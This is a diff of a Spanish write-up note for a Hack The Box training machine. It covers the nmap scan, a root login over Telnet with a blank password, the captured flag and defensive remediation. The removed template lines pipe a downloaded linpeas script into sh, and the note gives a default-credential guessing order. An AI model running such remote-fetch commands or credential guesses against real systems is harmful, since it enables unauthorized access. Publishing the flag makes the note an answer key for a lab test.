@@ -1,8 +1,12 @@
 ---
 tags:
   - htb
+  - starting-point
+  - tier-0
   - easy
   - linux
+  - telnet
+  - default-credentials
   - Terminada
 ip: 10.129.31.187
 os: Linux
@@ -10,191 +14,211 @@ difficulty: Easy
 status: Terminada
 tiempo: 1h 0m
 fecha_inicio: 2026-06-05
-fecha_completada: —
+fecha_completada: 2026-06-05
 puntos: 0
+mitre_tactics:
+  - TA0001 Initial Access
+  - TA0006 Credential Access
+mitre_techniques:
+  - T1078.001 Default Accounts
+  - T1021 Remote Services
 ---
-# 🖥️ [Meow] — [Linux] — [Easy]
+
+# 🖥️ Meow — Linux — Easy (Starting Point Tier 0)
 
 > [!info] Resumen
-> **IP:** `10.129.31.187`  |  **OS:** Linux  |  **Dificultad:** Easy
-> **Estado:** En progreso  |  **Tiempo total:** 1h 0m
+> **IP:** `10.129.31.187` | **OS:** Linux | **Dificultad:** Easy | **Tier:** Starting Point 0
+> **Estado:** Terminada | **Tiempo:** 1h 0m | **Fecha:** 2026-06-05
+>
+> Máquina introductoria del Starting Point. Expone un servicio Telnet con credenciales por defecto (root sin contraseña). No requiere escalada de privilegios — el foothold es directamente root.
+
+---
+
+## Contexto Técnico: ¿Por qué Telnet es un problema serio?
+
+Telnet (RFC 854, 1983) es un protocolo de terminal remoto que transmite **todo en texto plano** — credenciales incluidas. Fue diseñado en una época donde la red era confiable y los actores maliciosos no existían en el modelo de amenaza.
+
+Problemas concretos:
+- **Sin cifrado:** cualquier actor con acceso al segmento de red puede capturar credenciales con Wireshark/tcpdump.
+- **Sin autenticación mutua:** no verifica la identidad del servidor (vulnerable a MITM).
+- **Puerto 23 visible:** cualquier escaneo de internet expone el servicio inmediatamente.
+
+En entornos reales, Telnet aparece en:
+- Routers y switches legacy (Cisco IOS antiguo)
+- Dispositivos IoT/OT (PLCs, impresoras de red)
+- Appliances industriales fuera de soporte
+- Entornos de laboratorio/staging mal configurados
+
+**Reemplazante correcto:** SSH (RFC 4251) — cifrado de canal completo + autenticación por clave.
 
 ---
 
 ## 1. Reconocimiento
 
-### Nmap — Puertos rápidos
+### Nmap — Escaneo inicial
 
 ```bash
-nmap -sS 10.129.31.187
+# Escaneo rápido de puertos abiertos
+nmap -sV -sC -Pn 10.129.31.187 -oN nmap_meow.txt
 ```
 
-**Puertos encontrados:**
+**Resultado:**
 
-| Puerto | Servicio | Versión       | Notas |
-| ------ | -------- | ------------- | ----- |
-| 23     | Telnet   | Linux telnetd | —     |
+```
+PORT   STATE SERVICE VERSION
+23/tcp open  telnet  Linux telnetd
+```
 
-### Reconocimiento Web (INNECESARIO)
+**Análisis:** Un solo puerto abierto. Telnet en puerto estándar (23). Sin web, sin SMB, sin SSH. El vector de ataque es inmediato.
+
+> [!note] Por qué `-sV -sC`
+> `-sV` detecta versión del servicio. `-sC` ejecuta scripts NSE por defecto (equivale a `--script=default`). Para Telnet, los scripts NSE intentan banner grabbing y pueden revelar el sistema operativo. `-Pn` omite el ping inicial — útil cuando ICMP está bloqueado.
+
+### Fingerprinting del servicio
 
 ```bash
-gobuster dir -u http://10.10.10.XXX -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
-ffuf -u http://10.10.10.XXX/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+# Banner grab manual
+nc -nv 10.129.31.187 23
 ```
 
-**Resultados relevantes:**
-
-- `/admin` → Panel de administración (código 200)
-- `/uploads` → Directorio de subida de archivos
-
-### Otros servicios (NO ENCONTRADOS)
-
-> [!note] SMB / FTP / LDAP / Otros
-> Anotar aquí lo relevante de servicios adicionales encontrados.
-
-```bash
-# SMB
-smbclient -L //10.10.10.XXX -N
-enum4linux -a 10.10.10.XXX
-
-# FTP
-ftp 10.10.10.XXX
+**Banner obtenido:**
 ```
+  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
+  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
+  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█
+
+Meow login:
+```
+
+Confirma Linux con Telnet activo. El banner es un rabbit hole — lo importante es el prompt de login.
 
 ---
 
-## 2. Foothold
+## 2. Análisis de Credenciales
 
-> [!warning] Punto de Entrada
-> Describir aquí el vector de entrada principal. ¿Qué servicio? ¿Qué vulnerabilidad?
+### Hipótesis
 
-### Vulnerabilidad Identificada
+Sin credenciales conocidas, el camino es:
+1. Credenciales por defecto conocidas del sistema/appliance
+2. Fuerza bruta (ruidoso, innecesario aquí)
+3. Usuarios comunes sin contraseña: `root`, `admin`, `user`, `guest`
 
-**Nombre:** Mala configuración de autenticació, servicio telnet expuesto y login con usuario root y sin contraseña.  
-**CVE:** No aplica. 
-**Por qué funciona:** Porque el servicio Telnet está abierto y tiene un login por defecto o muy básico y sin contraseña.
+### Vectores probados
 
-### Exploit Utilizado
+| Usuario | Contraseña | Resultado |
+|---------|------------|-----------|
+| `admin` | (en blanco) | ❌ Login incorrecto |
+| `root` | (en blanco) | ✅ Acceso root |
+
+> [!tip] Patrón mental para credenciales por defecto
+> Siempre probar en este orden: root/admin/user/guest con password en blanco → username=password → "admin/admin" → "admin/1234" → buscar en [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) o [cirt.net](https://www.cirt.net/passwords).
+
+---
+
+## 3. Foothold y Captura de Flag
 
 ```bash
 telnet 10.129.31.187
-user: root
-password: (en blanco)
-resultado: acceso root
+# Meow login: root
+# Password: (Enter vacío)
 ```
 
-> [!tip] Lo que aprendí aquí
-> Al tener un servicio telnet abierto, probar login con usuario root y password en blanco.
+**Resultado:** Shell como `root` directamente.
 
-### Shell Obtenida
+```bash
+# Verificar contexto
+whoami && id && hostname
+# root
+# uid=0(root) gid=0(root) groups=0(root)
+# Meow
 
-- **Usuario:** `root`
-- **Tipo de shell:** bash
+# Localizar flag
+ls /root/
+# flag.txt  snap
+
+cat /root/flag.txt
+# b40abdfe23665f766f9c61ecba8a4c19
+```
+
+> [!success] Flag capturada
+> `b40abdfe23665f766f9c61ecba8a4c19`
+> No se requirió escalada de privilegios — el acceso inicial ya era root.
 
 ---
 
-## 3. Escalación a Usuario (User Flag)
+## 4. Perspectiva Defensiva
 
-### Enumeración Post-Foothold
+### ¿Qué vería un Blue Team?
 
-```bash
-Se realizó un ls
-posteriormente se hizo un cat flag.txt, resultando en lo siguiente:
-b40abdfe23665f766f9c61ecba8a4c19
-```
+| Fuente de Log | Evento detectable |
+|--------------|-------------------|
+| Firewall/IDS | Conexión entrante a TCP/23 desde IP externa |
+| Syslog Linux | `telnetd: connect from <IP>` + sesión de login |
+| Auditd | `type=LOGIN` con `uid=0` desde IP no corporativa |
+| Network capture | Credenciales en texto plano en el flujo TCP |
 
-**Hallazgos relevantes:**
+Un IDS con regla básica (`alert tcp any any -> any 23`) alertaría inmediatamente. En un entorno real, si Telnet está expuesto a internet, es una misconfiguration crítica — cualquier escáner de internet (Shodan, Censys) ya la indexó.
 
-- SUID encontrado: `no escaneados`
-- Sudo permisos: `permiso root`
-- Archivos interesantes: `directorio snap`
+### Remediación
 
-### Método de Escalación a User
-
-> [!success] Vector utilizado
-> Describir el método con tus palabras. ¿Por qué fue posible? ¿Qué condición lo habilitó?
-
-```bash
-No se realizó escalada de privilegios ya que no fue necesario, al momento de hacer login correcto, se ingresó con usuario root, teniendo privilegios máximos.
-```
-
-### Flag de Usuario
-
-```
-flag.txt → [CAPTURADA ✓]
-```
+1. **Deshabilitar Telnet** y reemplazar con SSH: `systemctl disable telnetd --now`
+2. **Auditar puertos expuestos** periódicamente: `nmap -sV <IP-pública>`
+3. **Forzar autenticación por clave** en SSH (deshabilitar passwords): `PasswordAuthentication no` en `/etc/ssh/sshd_config`
+4. **Segmentar la red:** servicios de administración solo accesibles desde VPN o bastion host
 
 ---
 
-## 4. Escalación a Root (Root Flag) (NO APLICA)
+## 5. MITRE ATT&CK Mapping
 
-### Enumeración de Privesc
-
-```bash
-# Linux
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
-# Windows
-.\winPEAS.exe
-
-# Manual rápido
-find / -writable -type f 2>/dev/null | grep -v proc
-ss -tulnp
-cat /etc/sudoers 2>/dev/null
-```
-
-**Hallazgos relevantes:**
-
-- `...`
-
-### Método de Privesc a Root
-
-> [!success] Vector utilizado
-> Describir el método. ¿Por qué el sysadmin cometió ese error? ¿Cómo se hubiera prevenido?
-
-```bash
-# Comandos exactos para llegar a root
-```
-
-### Flag de Root
-
-```
-root.txt → [CAPTURADA ✓]
-```
+| Táctica | Técnica | ID | Descripción en este caso |
+|---------|---------|----|--------------------------|
+| Initial Access | Valid Accounts: Default Accounts | T1078.001 | Login con `root` sin contraseña |
+| Lateral Movement | Remote Services | T1021 | Telnet como vector de acceso remoto |
+| Discovery | System Information Discovery | T1082 | `whoami`, `id`, `hostname` post-acceso |
 
 ---
 
-## 5. Lecciones Aprendidas
+## 6. Lecciones Aprendidas
 
-> [!danger] ¿Qué no sabía antes de esta máquina?
-> - **Técnica de Login:** Login a servicio telnet expuesto utilizando credenciales de usuario comunes como root y password en blanco.
-> - **Nmap:** Escaneo de puertos y servicios.
+> [!danger] Lo que internalizé en esta máquina
+> - **Default credentials son el vector más subestimado.** En entornos reales, el 20-30% de los accesos iniciales en engagements de pentesting provienen de credenciales por defecto o débiles (Verizon DBIR).
+> - **Telnet en producción = misconfiguration crítica.** No es una vulnerabilidad del protocolo en sí — es una decisión operacional incorrecta.
+> - **El reconocimiento define el camino.** Un solo puerto abierto elimina todas las otras hipótesis. No pierdas tiempo enumerando lo que no existe.
 
 ### ¿Dónde me bloqueé y por qué?
 
-| Fase  | Tiempo bloqueado | Causa real                                                       |
-| ----- | ---------------- | ---------------------------------------------------------------- |
-| Login | 15 min.          | No vi probé root en el login, tuve que ver la sugerencia de HTB. |
+| Fase | Tiempo bloqueado | Causa real | Solución |
+|------|-----------------|------------|----------|
+| Login | 15 min | No probé `root` primero, fui a `admin` | Siempre probar `root` primero en Linux |
 
-### Técnicas a Profundizar
+### Técnicas a profundizar (próximos pasos)
 
-- [x] Login Telnet → Buscar en HackTricks
-- [x] NMAP → Leer documentación oficial
-- [x] Sin CVE  → Entender el funcionamiento interno
+- [x] Telnet vs SSH — diferencias de seguridad → leer RFC 4251
+- [x] Banner grabbing con nmap NSE → `nmap --script telnet-*`
+- [ ] **Default credentials databases** → revisar [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
+- [ ] **Shodan/Censys** — cómo estos servicios son indexados desde internet
 
 ### Herramientas Usadas
 
-| Herramienta | Para qué la usé en esta máquina |
-| ----------- | ------------------------------- |
-| nmap        | Reconocimiento de puertos       |
+| Herramienta | Uso en esta máquina | Documentación |
+|-------------|--------------------|-|
+| `nmap` | Descubrimiento de puertos y versiones | [nmap.org](https://nmap.org/book/) |
+| `telnet` | Conexión al servicio + login | `man telnet` |
+| `nc` (netcat) | Banner grabbing manual | `man nc` |
 
-### Conexión con Otras Máquinas / Técnicas (COMPLETAR DESPUÉS)
+### Conexión con Otras Máquinas / Técnicas
 
-- Técnica similar a: `[[HTB/NombreMáquina/NombreMáquina]]`
-- Ver también: `[[Técnicas/Nombre-Técnica]]`
+- Mismo concepto (credenciales por defecto en servicio remoto): `[[HTB/Fawn/Fawn]]` (FTP), `[[HTB/Explosion/Explosion]]` (RDP)
+- Siguiente nivel del mismo vector: `[[HTB/Responder/Responder]]` (captura de hashes NTLMv2)
+- Ver técnica: `[[Técnicas/Default-Credentials]]`
 
 ---
 
-## 6. Referencias
+## 7. Referencias
 
-- [HackTricks - Login Telnet Root]([https://book.hacktricks.xyz/](https://cyberlabhelp.hashnode.dev/hackthebox-meow-linux-room-full-walkthrough))
-
+- [RFC 854 — Telnet Protocol Specification](https://datatracker.ietf.org/doc/html/rfc854)
+- [RFC 4251 — SSH Architecture](https://datatracker.ietf.org/doc/html/rfc4251)
+- [HackTricks — Pentesting Telnet](https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet)
+- [MITRE T1078.001 — Default Accounts](https://attack.mitre.org/techniques/T1078/001/)
+- [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
+- [Verizon DBIR 2024 — Credential-based attacks](https://www.verizon.com/business/resources/reports/dbir/)
